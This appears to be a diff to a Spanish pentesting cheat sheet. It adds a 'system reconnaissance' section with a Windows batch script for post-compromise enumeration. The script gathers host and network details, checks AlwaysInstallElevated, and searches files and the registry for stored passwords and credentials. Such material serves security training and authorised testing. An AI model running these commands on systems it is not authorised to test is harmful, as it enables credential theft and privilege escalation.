@@ -51,6 +51,7 @@
         * [Migración manual a proceso a 64 bits](#manual-migration-process)
         * [RCE Filter Evasion Microsoft SQL](#rce-filter-evasion-microsoft-sql)
         * [Conexión al Servicio Microsoft SQL con mssqclient.py de Impacket](#mssqlclient-impacket)
+        * [Reconocimiento del Sistema](#reconocimiento-del-sistema
 
           
 Antecedentes
@@ -1707,3 +1708,63 @@ python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
 ```
 
 Posteriormente, las consultas se hacen igual a las descritas en el anterior punto.
+
+#### Reconocimiento del Sistema
+
+Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llevar a cabo la siguiente enumeración manual, redireccionando todo a un fichero de reportes:
+
+```bash
+ @echo --------- BASIC WINDOWS RECON ---------  > report.txt
+ timeout 1
+ net config Workstation  >> report.txt
+ timeout 1
+ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
+ timeout 1
+ hostname >> report.txt
+ timeout 1
+ net users >> report.txt
+ timeout 1
+ ipconfig /all >> report.txt
+ timeout 1
+ route print >> report.txt
+ timeout 1
+ arp -A >> report.txt
+ timeout 1
+ netstat -ano >> report.txt
+ timeout 1
+ netsh firewall show state >> report.txt
+ timeout 1
+ netsh firewall show config >> report.txt
+ timeout 1
+ schtasks /query /fo LIST /v >> report.txt
+ timeout 1
+ tasklist /SVC >> report.txt
+ timeout 1
+ net start >> report.txt
+ timeout 1
+ DRIVERQUERY >> report.txt
+ timeout 1
+ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+ timeout 1
+ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+ timeout 1
+ dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
+ timeout 1
+ findstr /si password *.xml *.ini *.txt >> report.txt
+ timeout 1
+ reg query HKLM /f password /t REG_SZ /s >> report.txt
+ timeout 1
+ reg query HKCU /f password /t REG_SZ /s >> report.txt
+ timeout 1
+ dir "C:\"
+ timeout 1
+ dir "C:\Program Files\" >> report.txt
+ timeout 1
+ dir "C:\Program Files (x86)\"
+ timeout 1
+ dir "C:\Users\"
+ timeout 1
+ dir "C:\Users\Public\"
+ timeout 1
+ echo REPORT COMPLETE!
+```
